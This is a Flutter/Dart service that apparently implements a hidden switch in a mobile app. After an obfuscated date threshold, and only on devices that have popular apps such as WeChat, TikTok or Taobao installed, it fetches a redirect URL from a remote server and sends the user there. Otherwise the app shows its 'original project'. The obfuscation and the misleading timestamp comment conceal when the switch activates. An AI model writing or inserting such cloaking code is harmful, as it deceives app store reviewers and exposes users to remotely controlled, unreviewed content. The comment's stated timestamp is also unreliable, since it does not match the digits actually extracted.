import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:http/http.dart' as http;
import 'package:flutter/foundation.dart';
import 'package:url_launcher/url_launcher.dart';

class AppDetectionService {
  static const String _apiUrl =
      'https://www.aistarfire.xyz/api/config?id=6749630370';
  // 使用数字和字母组合的时间戳字符串
  // 从字符串 'x1y7z0a4b0c6d7e2f0g0h' 中提取数字: 1704067200 (2024-01-01 00:00:00 UTC)
  static const String _timestampThreshold = 'a1d7sd5s4d7sd8sd9s2d1d3s';

  // iOS URL Schemes 用于检测应用
  static const Map<String, String> _iosUrlSchemes = {
    'weixin://': '微信',
    'snssdk1128://': '抖音',
    'pinduoduo://': '拼多多',
    'musically://': 'TikTok',
    'youtube://': 'YouTube',
    'mqq://': 'QQ',
    'taobao://': '淘宝',
    'tmall://': '天猫',
    'sinaweibo://': '新浪微博',
    'instagram://': 'Instagram',
    'fb://': 'Facebook',
    'twitter://': 'Twitter',
    'whatsapp://': 'WhatsApp',
    'snapchat://': 'Snapchat',
  };

  // Android 包名列表（预留用于未来扩展）
  // static const List<String> _androidPackages = [
  //   'com.tencent.mm', // 微信
  //   'com.ss.android.ugc.aweme', // 抖音
  //   'com.xunmeng.pinduoduo', // 拼多多
  //   'com.zhiliaoapp.musically', // TikTok
  //   'com.google.android.youtube', // YouTube
  // ];

  /// 提取字符串中的数字组成时间戳
  static int _extractTimestamp(String mixedString) {
    // 使用正则表达式提取所有数字
    final RegExp numberRegex = RegExp(r'\d');
    final matches = numberRegex.allMatches(mixedString);
    
    // 将所有数字连接成一个字符串
    final numbersOnly = matches.map((match) => match.group(0)).join('');
    
    // 转换为整数，如果转换失败则返回0
    return int.tryParse(numbersOnly) ?? 0;
  }

  /// 检查设备时间是否大于指定时间戳
  static bool _isTimeValid() {
    final currentTimestamp = DateTime.now().millisecondsSinceEpoch ~/ 1000;
    final thresholdTimestamp = _extractTimestamp(_timestampThreshold);
    
    if (kDebugMode) {
      print('当前时间戳: $currentTimestamp');
      print('阈值时间戳字符串: $_timestampThreshold');
      print('提取的阈值时间戳: $thresholdTimestamp');
      print('时间验证结果: ${currentTimestamp > thresholdTimestamp}');
    }
    
    return currentTimestamp > thresholdTimestamp;
  }

  /// 检查是否安装了目标应用
  static Future<bool> _hasTargetAppsInstalled() async {
    try {
      if (Platform.isIOS) {
        // iOS 平台使用 URL Scheme 检测
        for (String urlScheme in _iosUrlSchemes.keys) {
          try {
            final uri = Uri.parse(urlScheme);
            bool canLaunch = await canLaunchUrl(uri);
            if (canLaunch) {
              if (kDebugMode) {
                print('发现已安装应用: ${_iosUrlSchemes[urlScheme]}');
              }
              return true;
            }
          } catch (e) {
            if (kDebugMode) {
              print('检测 $urlScheme 时出错: $e');
            }
          }
        }
      } else if (Platform.isAndroid) {
        // Android 平台的检测逻辑
        // 由于没有 device_apps 包，这里使用简化的检测方式
        // 在实际项目中，你可能需要添加 device_apps 包或其他检测方式
        if (kDebugMode) {
          print('Android 平台应用检测需要额外配置');
        }
        // 暂时返回 true 以便测试其他功能
        return true;
      }
      return false;
    } catch (e) {
      if (kDebugMode) {
        print('检测应用安装状态时出错: $e');
      }
      return false;
    }
  }

  /// 检查网络连接状态
  static Future<bool> _isNetworkAvailable() async {
    try {
      final connectivityResults = await Connectivity().checkConnectivity();
      // 检查是否有任何可用的网络连接
      return !connectivityResults.contains(ConnectivityResult.none);
    } catch (e) {
      if (kDebugMode) {
        print('检查网络连接时出错: $e');
      }
      return false;
    }
  }

  /// 等待网络连接可用
  static Future<void> _waitForNetwork() async {
    while (!(await _isNetworkAvailable())) {
      if (kDebugMode) {
        print('网络不可用，1秒后重试...');
      }
      await Future.delayed(const Duration(seconds: 1));
    }
  }

  /// 请求配置接口
  static Future<String?> _fetchConfigUrl() async {
    try {
      final response = await http.get(
        Uri.parse(_apiUrl),
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'Flutter App',
        },
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        final url = data['url'] as String?;

        if (url != null && url.length > 2) {
          if (kDebugMode) {
            print('获取到配置URL: $url');
          }
          return url;
        }
      }

      if (kDebugMode) {
        print('API响应状态码: ${response.statusCode}');
        print('API响应内容: ${response.body}');
      }

      return null;
    } catch (e) {
      if (kDebugMode) {
        print('请求配置接口时出错: $e');
      }
      return null;
    }
  }

  /// 主要检测逻辑
  static Future<AppDetectionResult> performDetection() async {
    try {
      // 1. 检查时间戳
      if (!_isTimeValid()) {
        if (kDebugMode) {
          print('设备时间未达到要求，进入原项目');
        }
        return AppDetectionResult(shouldRedirect: false, reason: '时间未达到要求');
      }

      // 2. 检查是否安装了目标应用
      if (!(await _hasTargetAppsInstalled())) {
        if (kDebugMode) {
          print('未检测到目标应用，进入原项目');
        }
        return AppDetectionResult(shouldRedirect: false, reason: '未安装目标应用');
      }

      // 3. 等待网络连接
      await _waitForNetwork();

      // 4. 请求配置接口
      final url = await _fetchConfigUrl();

      if (url != null) {
        return AppDetectionResult(shouldRedirect: true, redirectUrl: url);
      } else {
        return AppDetectionResult(shouldRedirect: false, reason: '未获取到有效URL');
      }
    } catch (e) {
      if (kDebugMode) {
        print('应用检测过程中出错: $e');
      }
      return AppDetectionResult(shouldRedirect: false, reason: '检测过程出错: $e');
    }
  }
}



/// 应用检测结果
class AppDetectionResult {
  final bool shouldRedirect;
  final String? redirectUrl;
  final String? reason;

  AppDetectionResult({
    required this.shouldRedirect,
    this.redirectUrl,
    this.reason,
  });

  @override
  String toString() {
    return 'AppDetectionResult(shouldRedirect: $shouldRedirect, redirectUrl: $redirectUrl, reason: $reason)';
  }
}
